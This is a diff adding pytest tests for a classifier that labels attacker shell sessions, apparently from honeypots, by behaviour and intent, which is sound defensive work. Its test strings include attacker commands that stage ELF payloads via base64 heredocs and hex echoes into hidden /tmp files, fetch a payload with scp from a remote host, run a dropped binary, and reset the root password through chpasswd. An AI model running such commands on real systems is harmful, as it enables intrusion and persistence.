@@ -566,3 +566,72 @@ def test_a_shebang_is_not_a_shell_running_the_next_line() -> None:
 def test_a_pasted_script_that_runs_a_payload_on_its_own_line_is_caught() -> None:
     label = classify(facts("cd /tmp\nchmod +x .d\n./.d"))
     assert Behaviour.PAYLOAD_EXECUTION in label.behaviours
+
+
+# --- v0.6.0: the gaps the evaluation confirmed ------------------------------
+
+
+def test_a_binary_written_through_a_base64_heredoc_is_staging() -> None:
+    """Preregistered before labelling, confirmed on all three such items, and
+    filed as resource_profiling by the v0.5.0 rules."""
+    label = classify(
+        SessionFacts(
+            session_id="s",
+            commands=("cat /proc/cpuinfo", "base64 -d > /tmp/hum <<.", "f0VMRgIBAQAAAAAAAAAAAA"),
+        )
+    )
+    assert Behaviour.PAYLOAD_WRITE in label.behaviours
+    assert Behaviour.BASE64_DECODE in label.behaviours
+    assert label.intent is Intent.STAGING
+
+
+def test_a_binary_written_a_few_hex_bytes_at_a_time_is_a_payload_write() -> None:
+    label = classify(facts(r'/bin/busybox echo -ne "\x7F\x45\x4C\x46\x01\x01\x01\x61" >> .d'))
+    assert Behaviour.PAYLOAD_WRITE in label.behaviours
+
+
+def test_the_anonymised_form_of_the_same_write_is_still_a_payload_write() -> None:
+    """The evaluation set carries long hex runs cut to four bytes and a marker."""
+    command = r'echo -ne "\x7F\x45\x4C\x46<+28 bytes sha256:2286a7581fa4>" >> .d'
+    assert Behaviour.PAYLOAD_WRITE in classify(facts(command)).behaviours
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Spells `Port` into a probe file: a writable-directory test.
+        r"/bin/busybox echo -e '\x50\x6f\x72\x74/tmp' > /tmp/.none",
+        # A marker long enough to be cut, with no redirection at all. The
+        # marker's own closing `>` must not pass for one.
+        r'echo -e "\x61\x75\x74\x68<+4 bytes sha256:e2324f65e525>"',
+        # Checking that base64 exists, writing nothing.
+        "/bin/busybox echo b1d4Q21CSAo=|base64 -d",
+    ],
+)
+def test_probes_that_look_like_payload_writes_are_not(command: str) -> None:
+    assert Behaviour.PAYLOAD_WRITE not in classify(facts(command)).behaviours
+
+
+def test_scp_from_a_remote_host_is_a_download() -> None:
+    command = "chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@198.51.100.5:sh out_sh"
+    assert Behaviour.PAYLOAD_DOWNLOAD in classify(facts(command)).behaviours
+
+
+def test_scp_to_a_remote_host_is_not_a_download() -> None:
+    assert (
+        Behaviour.PAYLOAD_DOWNLOAD not in classify(facts("scp f user@203.0.113.2:/tmp/")).behaviours
+    )
+
+
+@pytest.mark.parametrize(
+    "command",
+    ['echo "root:pWbFKVgUWhvz"|chpasswd|bash', 'echo -e "luca\\nx\\nx"|passwd|bash', "passwd root"],
+)
+def test_setting_a_password_is_persistence(command: str) -> None:
+    label = classify(facts(command))
+    assert Behaviour.PASSWORD_CHANGE in label.behaviours
+    assert label.intent is Intent.PERSISTENCE
+
+
+def test_reading_the_password_file_is_not_changing_a_password() -> None:
+    assert Behaviour.PASSWORD_CHANGE not in classify(facts("cat /etc/passwd")).behaviours
